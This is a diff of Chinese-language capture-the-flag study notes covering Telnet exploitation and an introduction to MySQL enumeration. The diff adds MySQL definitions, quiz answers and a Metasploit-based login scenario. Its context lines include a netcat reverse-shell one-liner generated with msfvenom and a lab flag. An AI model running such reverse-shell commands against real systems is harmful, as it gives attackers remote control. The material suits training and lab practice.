@@ -283,9 +283,9 @@ SF:s\n")%r(GenericLines,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\
 ````
 
 
-# Telnet 漏洞利用
+## Telnet 漏洞利用
 
-## telnet 登陆
+###  telnet 登陆
 
 ````ad-info
 title: 登陆telnet
@@ -319,7 +319,7 @@ sudo tcpdump ip proto \\icmp -i eth0  # 本地IP
 **答案：** `Y`
 ````
 
-## Payload生产
+###  Payload生产
 ````ad-info
 title: 生成`payload`
 4. 用`msfvenom` 生成反向`shell` 的payload，`payload`以哪个单词开头 ？
@@ -337,7 +337,7 @@ mkfifo /tmp/mbilfvt; nc 10.10.33.28 4444 0</tmp/mbilfvt | /bin/sh >/tmp/mbilfvt 
 ````
 
 
-## 反弹Shell
+### 反弹Shell
 
 ````ad-info
 title: 反弹shell,获取`flag`
@@ -950,3 +950,47 @@ title:问题
 
     **答案**：`THM{who_knew_email_servers_were_c00l?}`
 ````
+
+
+#  MySQL
+
+MySQL是基于结构化查询语言（SQL）的关系数据库管理系统（relational database management system（RDBMS））。
+
+- Database ：数据库是结构化数据的集合 
+- RDBMS：一种软件或服务，基于关系模型创建和管理数据库。“关系”一词只是指存储在数据集中的数据被组织成表格。每个表格都以某种方式与彼此的“主键”或其他“关键”因素相关。
+- SQL：结构化查询语言。
+
+MySQL 作为一个 RDBMS，由服务器和有助于管理 MySQL 数据库的实用程序组成。服务器处理所有数据库指令，例如创建、编辑和访问数据。它接受和管理这些请求并使用MySQL协议进行通信。这 整个过程可以分为以下几个阶段：
+- MySQL创建一个数据库来存储和操作数据，定义每个表的关系。
+- 客户端通过在 SQL 中发出特定语句来发出请求。
+- 服务器将使用所请求的任何信息来响应客户端。
+
+MySQL可以运行在各种平台上，无论是Linux还是Windows。它通常用作许多著名网站的后端数据库，并构成 LAMP 堆栈的重要组件，其中包括：Linux、Apache、MySQL 和 PHP。
+
+以下是一些资源，它们比我在这里介绍的更详细地解释了MySQL的技术实现和工作：
+
+[https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html](https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html) 
+
+[https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html](https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html) 
+
+[https://www.w3schools.com/php/php_mysql_intro.asp](https://www.w3schools.com/php/php_mysql_intro.asp)
+
+[https://www.w3schools.com/php/php_mysql_intro.asp](https://www.w3schools.com/php/php_mysql_intro.asp)
+
+````ad-info
+title: 题目
+1. Mysql是什么类型的软件？ **答案:  `relational database management system`（关系型数据库管理系统）**
+2. Mysql是基于什么语言的？ **答案：`sql`**
+3. Mysql使用的是什么模型进行通信的？ **答案：`client-server` **\
+4. Mysql通常应用在什么地方？ **答案： `back end database`（后端数据库）**
+5. 什么社交软件的后端数据库是使用的Mysql？**答案：`Facebook`**
+````
+
+## 枚举
+
+- Mysql 一般不会成为第一个攻击点;
+- 一般会通过枚举其他服务，获得一些凭据，然后利用这些凭据来枚举和利用`Mysql`
+- 本场景假设在枚举web服务器时，获取到了凭据：“`root`： `password`”。在尝试登录SSH失败后，您决定尝试登录MySQL。
+- 您需要在系统上安装Mysql-client来连接远程服务器：`sudo apt install default-mysql-client`
+- 利用工具使用`Metasploit`
+
